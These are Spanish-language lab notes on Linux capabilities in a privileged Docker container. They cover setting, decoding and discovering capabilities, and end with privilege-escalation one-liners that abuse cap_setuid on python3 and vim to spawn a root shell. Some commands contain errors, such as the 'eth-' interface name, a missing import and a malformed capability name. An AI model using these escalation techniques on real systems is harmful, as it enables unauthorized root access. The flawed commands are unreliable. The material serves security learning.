Hay que crear un nuevo contenedor con permisos privilegiados
```
docker run -dit --privileged --name serverUb ubuntu
```
- Hacemos arreglos
```
apt update
apt install libcap2-bin
apt install tcpdump net-tools
which setcap
which getcap
```
- Este programa solo lo podemos ejecutar como usuarios privilegiados
```
tcpdump
```
- Un ejemplo de uso
```
tcpdump -i eth- icmp -n -w Captura.cap
```

- Luego asi podemos ver que estado tiene un proceso, leer el codigo y ver las caps y luego decodearlo para leer en texto plano
```
ls /proc/9/status
cat /proc/9/status | grep cap

Aparecen numeros y seleccionamos una cadena

capsh --decode=cadena
```

- Para setear una capability
```
setcap cap_net_raw,cap_net_admin=eip /usr/bin/tcpdump
```

- Luego como otro usuario descubrimos capabilities
```
su savitar
getcap -r / 2>/dev/null
```
- Y podemos ejecutar tranquilos:
```
tcpdump -i eth0
```

- Para obtener mas facil las capabilities de un proceso mediante su pid
```
getpcaps <pid>
```

- **cap_setuid+ep** te permiten manipular el uid, por ejemplo para root es 0 y asi secuencialmente
```
apt install python3
which python3.10
setcap cap_setuid=ep /usr/bin/python3.10
python3.10 -c 'import os; os.setuid(0); system("bash")'
setcap -r /usr/bin/python3.10
```

- Importante: ver en gtfobins otras capabilities
- Como esta en vim:
```
apt install vim
which vim
setcap setuid=ep /usr/bin/vim,basic
vim -c ':py3 import os; os.setuid(0); os.exec("/bin/bash", "sh", "-c", "reset; exec sh")'
```
